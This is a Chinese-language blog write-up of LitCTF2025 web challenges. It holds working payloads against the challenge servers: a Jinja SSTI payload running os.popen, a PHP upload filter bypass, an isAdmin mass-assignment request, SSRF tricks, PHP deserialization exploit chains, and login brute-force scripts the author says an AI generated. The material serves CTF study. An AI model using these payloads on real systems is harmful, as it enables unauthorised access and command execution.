---

title: "LitCTF2025（公开赛道）（web"
date: 2025-08-30 18:19:31
author: Xendr1a

---

LitCTF2025（公开赛道）（web

日期：2025-08-30 18:19:31

easy_file

首先是登入界面爆破发现账户密码是base64后的admin和password，进入界面看源码也能看到是对其经过处理的

![rId20.png](/img/LitCTF2025-公开赛道-web/rId20.png)

来到上传界面上传，经过测试是过滤了&lt;?php,换成短标签&lt;?就可以

![rId23.png](/img/LitCTF2025-公开赛道-web/rId23.png)

上传成功，然后就有一个很抽象的点，admin.php下是可以进行file参数任意文件读取的（卡这半天，后面学长出了）后面就是大家都会的步骤了

![rId26.png](/img/LitCTF2025-公开赛道-web/rId26.png)

星愿信箱

需要包含文字，过滤了&#123;&#123;吧，我们用&#123;%绕过了，没有回显我们就加print这样

![rId30.png](/img/LitCTF2025-公开赛道-web/rId30.png)

然后用的是

&lt;code&gt;&#123;%print(lipsum.&lt;strong&gt;globals&lt;/strong&gt;.&lt;strong&gt;builtins&lt;/strong&gt;.&lt;strong&gt;import&lt;/strong&gt;(&#39;os&#39;).popen(&#39;ls /&#39;).read())%}&lt;/code&gt;

![rId33.png](/img/LitCTF2025-公开赛道-web/rId33.png)

nest_js

![rId37.png](/img/LitCTF2025-公开赛道-web/rId37.png)

账户密码admin passwor登入即送flag

多重宇宙日记

先随便创造个用户登入进去进入这个界面

![rId41.png](/img/LitCTF2025-公开赛道-web/rId41.png)

我们看他的源码

// 更新表单的JS提交        document.getElementById(&#39;profileUpdateForm&#39;).addEventListener(&#39;submit&#39;, async function(event) {            event.preventDefault();            const statusEl = document.getElementById(&#39;updateStatus&#39;);            const currentSettingsEl = document.getElementById(&#39;currentSettings&#39;);            statusEl.textContent = &#39;正在更新...&#39;;            const formData = new FormData(event.target);            const settingsPayload = {};            // 构建 settings 对象，只包含有值的字段            if (formData.get(&#39;theme&#39;)) settingsPayload.theme = formData.get(&#39;theme&#39;);            if (formData.get(&#39;language&#39;)) settingsPayload.language = formData.get(&#39;language&#39;);            // ...可以添加其他字段            try {                const response = await fetch(&#39;/api/profile/update&#39;, {                    method: &#39;POST&#39;,                    headers: {                        &#39;Content-Type&#39;: &#39;application/json&#39;,                    },                    body: JSON.stringify({ settings: settingsPayload }) // 包装在 &quot;settings&quot;键下                });                const result = await response.json();                if (response.ok) {                    statusEl.textContent = &#39;成功: &#39; + result.message;                    currentSettingsEl.textContent = JSON.stringify(result.settings, null, 2);                    // 刷新页面以更新导航栏（如果isAdmin状态改变）                    setTimeout(() =&gt; window.location.reload(), 1000);                } else {                    statusEl.textContent = &#39;错误: &#39; + result.message;                }            } catch (error) {                statusEl.textContent = &#39;请求失败: &#39; + error.toString();            }        });

说明了需要让isAdmin=ture,我们发送{ &quot;settings&quot;: { &quot;isAdmin&quot;: true } }获得管理员面板

![rId44.png](/img/LitCTF2025-公开赛道-web/rId44.png)

easy_signin

界面是404，我们直接开扫

![rId48.png](/img/LitCTF2025-公开赛道-web/rId48.png)

分别是

![rId51.png](/img/LitCTF2025-公开赛道-web/rId51.png)

![rId54.png](/img/LitCTF2025-公开赛道-web/rId54.png)

源码有个api.js看看

![rId57.png](/img/LitCTF2025-公开赛道-web/rId57.png)

看见url第一反应就是127.0.0.1

![rId60.png](/img/LitCTF2025-公开赛道-web/rId60.png)

然后就卡住了，我们回到之前的登入界面看看他的逻辑，他给了

const loginBtn = document.getElementById(&#39;loginBtn&#39;);        const passwordInput = document.getElementById(&#39;password&#39;);        const errorTip = document.getElementById(&#39;errorTip&#39;);        const rawUsername = document.getElementById(&#39;username&#39;).value;        loginBtn.addEventListener(&#39;click&#39;, async () =&gt; {            const rawPassword = passwordInput.value.trim();            if (!rawPassword) {                errorTip.textContent = &#39;请输入密码&#39;;                errorTip.classList.add(&#39;show&#39;);                passwordInput.focus();                return;            }            const md5Username = CryptoJS.MD5(rawUsername).toString();            const md5Password = CryptoJS.MD5(rawPassword).toString();            const shortMd5User = md5Username.slice(0, 6);            const shortMd5Pass = md5Password.slice(0, 6);            const timestamp = Date.now().toString(); //五分钟            const secretKey = &#39;easy_signin&#39;;            const sign = CryptoJS.MD5(shortMd5User + shortMd5Pass + timestamp + secretKey).toString();            try {                const response = await fetch(&#39;login.php&#39;, {                    method: &#39;POST&#39;,                    headers: {                        &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,                        &#39;X-Sign&#39;: sign                    },                    body: new URLSearchParams({                        username: md5Username,                        password: md5Password,                        timestamp: timestamp                    })                });                const result = await response.json();                if (result.code === 200) {                    alert(&#39;登录成功！&#39;);                    window.location.href = &#39;dashboard.php&#39;;                } else {                    errorTip.textContent = result.msg;                    errorTip.classList.add(&#39;show&#39;);                    passwordInput.value = &#39;&#39;;                    passwordInput.focus();                    setTimeout(() =&gt; errorTip.classList.remove(&#39;show&#39;), 3000);                }            } catch (error) {                errorTip.textContent = &#39;网络请求失败&#39;;                errorTip.classList.add(&#39;show&#39;);                setTimeout(() =&gt; errorTip.classList.remove(&#39;show&#39;), 3000);            }        });        passwordInput.addEventListener(&#39;input&#39;, () =&gt; {            errorTip.classList.remove(&#39;show&#39;);        });

通过这个我们可以知道他的密码的生成逻辑，直接叫ai搓一个

import requestsimport hashlibimport time# 配置参数username = &#39;admin&#39;  # 假设用户名已知，如果不同请修改password_file = &#39;&#39;  # 密码字典文件路径url = &#39;&#39;  # 登录URL，请替换为实际URL# 计算用户名的MD5（固定值）md5_user = hashlib.md5(username.encode()).hexdigest()# 读取密码字典try:    with open(password_file, &#39;r&#39;) as f:        passwords = [line.strip() for line in f.readlines()]except FileNotFoundError:    print(f&quot;密码文件 {password_file} 未找到&quot;)    exit(1)# 遍历密码字典for password in passwords:    # 计算密码的MD5    md5_pass = hashlib.md5(password.encode()).hexdigest()    short_user = md5_user[:6]    short_pass = md5_pass[:6]    timestamp = str(int(time.time() * 1000))  # 当前毫秒时间戳    sign_str = short_user + short_pass + timestamp + &#39;easy_signin&#39;    sign = hashlib.md5(sign_str.encode()).hexdigest()    # 构造请求头和数据    headers = {        &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,        &#39;X-Sign&#39;: sign    }    data = {        &#39;username&#39;: md5_user,        &#39;password&#39;: md5_pass,        &#39;timestamp&#39;: timestamp    }    # 发送POST请求    try:        response = requests.post(url, headers=headers, data=data, timeout=5)        # 检查响应状态码和内容        if response.status_code == 200:            # 假设成功响应中包含&quot;success&quot;关键字，根据实际响应调整            if &#39;success&#39; in response.text.lower():                print(f&quot;[+] 找到密码: {password}&quot;)                break            else:                print(f&quot;[-] 尝试密码: {password} 失败，响应: {response.text}&quot;)        else:            print(f&quot;[-] 尝试密码: {password} 失败，状态码: {response.status_code}&quot;)    except requests.exceptions.RequestException as e:        print(f&quot;[-] 请求异常 for password: {password}, error: {e}&quot;)    # 可选：添加延迟避免请求过快    # time.sleep(0.1)print(&quot;爆破完成&quot;)

爆破出来是密码是admin123，依旧是让ai搓个登入后访问/dashboard.php

import requestsimport hashlibimport timeimport json# 配置参数username = &#39;admin&#39;  # 假设用户名为 &#39;admin&#39;，如果不是请修改password = &#39;admin123&#39;  # 已知的正确密码login_url = &#39;http://node6.anna.nssctf.cn:20560/login.php&#39;  # 请替换为实际的登录URLdashboard_url = &#39;http://node6.anna.nssctf.cn:20560/dashboard.php&#39;  # 请替换为实际的dashboard URL# 创建一个会话对象来保持cookiessession = requests.Session()# 计算用户名的MD5md5_user = hashlib.md5(username.encode()).hexdigest()print(f&quot;用户 &#39;{username}&#39; 的MD5: {md5_user}&quot;)# 计算密码的MD5md5_pass = hashlib.md5(password.encode()).hexdigest()print(f&quot;密码 &#39;{password}&#39; 的MD5: {md5_pass}&quot;)# 截取前6位short_user = md5_user[:6]short_pass = md5_pass[:6]print(f&quot;用户名MD5前6位: {short_user}&quot;)print(f&quot;密码MD5前6位: {short_pass}&quot;)# 生成时间戳（毫秒）timestamp = str(int(time.time() * 1000))print(f&quot;时间戳: {timestamp}&quot;)# 计算签名secret_key = &#39;easy_signin&#39;sign_str = short_user + short_pass + timestamp + secret_keysign = hashlib.md5(sign_str.encode()).hexdigest()print(f&quot;签名字符串: {sign_str}&quot;)print(f&quot;签名MD5: {sign}&quot;)# 构造登录请求头和数据headers = {    &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,    &#39;X-Sign&#39;: sign,    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&#39;}data = {    &#39;username&#39;: md5_user,    &#39;password&#39;: md5_pass,    &#39;timestamp&#39;: timestamp}print(&quot;\n&quot; + &quot;=&quot; * 50)print(&quot;发送登录请求...&quot;)print(&quot;=&quot; * 50)# 发送登录POST请求try:    login_response = session.post(login_url, headers=headers, data=data)    print(f&quot;登录请求URL: {login_url}&quot;)    print(f&quot;请求方法: POST&quot;)    print(&quot;\n登录请求头:&quot;)    for key, value in headers.items():        print(f&quot;  {key}: {value}&quot;)    print(&quot;\n登录请求体:&quot;)    print(f&quot;  {data}&quot;)    print(&quot;\n&quot; + &quot;-&quot; * 50)    print(f&quot;登录响应状态码: {login_response.status_code}&quot;)    print(f&quot;登录响应时间: {login_response.elapsed.total_seconds():.2f}秒&quot;)    print(&quot;\n登录响应头:&quot;)    for key, value in login_response.headers.items():        print(f&quot;  {key}: {value}&quot;)    print(&quot;\n登录响应内容:&quot;)    # 尝试解析JSON响应，如果不是JSON则直接显示文本    try:        json_response = login_response.json()        print(json.dumps(json_response, indent=2, ensure_ascii=False))    except ValueError:        print(login_response.text)    print(&quot;\n当前会话Cookies:&quot;)    for cookie in session.cookies:        print(f&quot;  {cookie.name}: {cookie.value}&quot;)    print(&quot;\n&quot; + &quot;=&quot; * 50)    if login_response.status_code == 200:        print(&quot;[+] 登录请求发送成功!&quot;)        # 这里可以根据实际响应内容判断是否登录成功        if &#39;success&#39; in login_response.text.lower() or &#39;登录成功&#39; in login_response.text:            print(&quot;[+] 登录成功!&quot;)        else:            print(&quot;[-] 登录可能失败，请检查响应内容&quot;)    else:        print(f&quot;[-] 登录请求失败，状态码: {login_response.status_code}&quot;)except requests.exceptions.RequestException as e:    print(f&quot;[-] 登录请求异常: {e}&quot;)    print(f&quot;异常详情: {str(e)}&quot;)    exit(1)# 访问 dashboard.phpprint(&quot;\n\n&quot; + &quot;=&quot; * 50)print(&quot;访问 Dashboard...&quot;)print(&quot;=&quot; * 50)try:    dashboard_response = session.get(dashboard_url)    print(f&quot;Dashboard请求URL: {dashboard_url}&quot;)    print(f&quot;请求方法: GET&quot;)    print(&quot;\nDashboard请求头:&quot;)    # 显示发送到dashboard的请求头    dashboard_headers = {        &#39;User-Agent&#39;: headers[&#39;User-Agent&#39;]    }    for key, value in dashboard_headers.items():        print(f&quot;  {key}: {value}&quot;)    print(&quot;\n&quot; + &quot;-&quot; * 50)    print(f&quot;Dashboard响应状态码: {dashboard_response.status_code}&quot;)    print(f&quot;Dashboard响应时间: {dashboard_response.elapsed.total_seconds():.2f}秒&quot;)    print(&quot;\nDashboard响应头:&quot;)    for key, value in dashboard_response.headers.items():        print(f&quot;  {key}: {value}&quot;)    print(&quot;\nDashboard响应内容:&quot;)    # 尝试解析JSON响应，如果不是JSON则直接显示文本    try:        json_response = dashboard_response.json()        print(json.dumps(json_response, indent=2, ensure_ascii=False))    except ValueError:        # 如果是HTML，只显示前1000字符，避免控制台输出过多        content = dashboard_response.text        if len(content) &gt; 1000:            print(content[:1000] + &quot;...\n[内容过长，已截断]&quot;)        else:            print(content)    print(&quot;\n&quot; + &quot;=&quot; * 50)    if dashboard_response.status_code == 200:        print(&quot;[+] Dashboard访问成功!&quot;)    else:        print(f&quot;[-] Dashboard访问失败，状态码: {dashboard_response.status_code}&quot;)except requests.exceptions.RequestException as e:    print(f&quot;[-] Dashboard请求异常: {e}&quot;)    print(f&quot;异常详情: {str(e)}&quot;)

![rId63.png](/img/LitCTF2025-公开赛道-web/rId63.png)

我们利用那个url参数打ssrf

![rId66.png](/img/LitCTF2025-公开赛道-web/rId66.png)

这里可以用ls /var/www/html来找需要用二次编码（应该是快照和网页的两次解码），我们发现了327a6c4304ad5938eaf0efb6cc3e53dc.php

![rId69.png](/img/LitCTF2025-公开赛道-web/rId69.png)

访问得flag

![rId72.png](/img/LitCTF2025-公开赛道-web/rId72.png)

还有一种方法说url参数那是能用php://(php大小写混用绕过即可)或者file://来读取源码或者urlcode.php的内容（没有去特意去看了)

![rId75.png](/img/LitCTF2025-公开赛道-web/rId75.png)

君の名は

参考自https://www.cnblogs.com/Litsasuk/articles/18896993

&lt;?phphighlight_file(__FILE__);error_reporting(0);create_function(&quot;&quot;, &#39;die(`/readflag`);&#39;);class Taki{    private $musubi;    private $magic;    public function __unserialize(array $data)    {        $this-&gt;musubi = $data[&#39;musubi&#39;];        $this-&gt;magic = $data[&#39;magic&#39;];        return ($this-&gt;musubi)();    }    public function __call($func,$args){        (new $args[0]($args[1]))-&gt;{$this-&gt;magic}();    }}class Mitsuha{    private $memory;    private $thread;    public function __invoke()    {        return $this-&gt;memory.$this-&gt;thread;    }}class KatawareDoki{    private $soul;    private $kuchikamizake;    private $name;    public function __toString()    {        ($this-&gt;soul)-&gt;flag($this-&gt;kuchikamizake,$this-&gt;name);        return &quot;call error!no flag!&quot;;    }}$Litctf2025 = $_POST[&#39;Litctf2025&#39;];if(!preg_match(&quot;/^[Oa]:[\d]+/i&quot;, $Litctf2025)){    unserialize($Litctf2025);}else{    echo &quot;把O改成C不就行了吗,笨蛋!～(∠・ω&lt; )⌒☆&quot;;}

我们的主要目的应该就是create_function(&quot;&quot;, &#39;die(/readflag);&#39;);，create_function()是用来创建匿名函数的，看到把O改成C很容易想到原生类https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9B%B8%E5%85%B3

ArrayObject::unserializeArrayIterator::unserializeRecursiveArrayIterator::unserializeSplDoublyLinkedList::unserializeSplQueue::unserializeSplStack::unserializeSplObjectStorage::unserialize

那思路应该就是利用原生类来调用匿名函数，找到ReflectionFunction的invoke方法可以调用函数

![rId81.png](/img/LitCTF2025-公开赛道-web/rId81.png)

但是匿名函数怎么弄呢，可以直接用

&lt;?php$a=create_function(&quot;&quot;, &#39;die(`/readflag`);&#39;);var_dump(   $a);#string(9) &quot;\000lambda_1&quot;

\000lambda_1这个就是名字了，但是匿名函数的函数名是会改变的，在web页面中打开php文件，每刷新一次函数名的数字就会加一，最好是重新开一下环境

Litsasuk师傅的exp&lt;?phphighlight_file(__FILE__);error_reporting(0);class Taki{    public $musubi;    public $magic = &quot;invoke&quot;;}class Mitsuha{    public $memory;    public $thread;}class KatawareDoki{    public $soul;    public $kuchikamizake = &quot;ReflectionFunction&quot;;    public $name = &quot;\000lambda_1&quot;;}$a = new Taki();$b = new Mitsuha();$c = new KatawareDoki();$a-&gt;musubi = $b;     // 1.把对象当成函数调用，触发__invoke()$b-&gt;thread = $c;     // 2. 把对象作为字符串使用，触发__toString()$c-&gt;soul = $a;           // 3. 调用不存在的方法，触发__call()$arr=array(&quot;evil&quot;=&gt;$a);$d=new ArrayObject($arr);echo urlencode(serialize($d));

还有一个非预期，直接在return ($this-&gt;musubi)();处调用匿名函数

&lt;?phphighlight_file(__FILE__);error_reporting(0);class Taki{    public $musubi = &quot;\000lambda_1&quot;;    public $magic = &quot;&quot;;}$a = new Taki();$arr=array(&quot;evil&quot;=&gt;$a);$d=new ArrayObject($arr);echo urlencode(serialize($d));

总结

拖那么久才想起来复现，easy_signineasy_signin比赛时候没出来有点可惜，这题反序列化的话其实现在还是有点迷迷糊糊（本来基础不扎实），加油吧！官方wphttps://godyu.com/13917.html
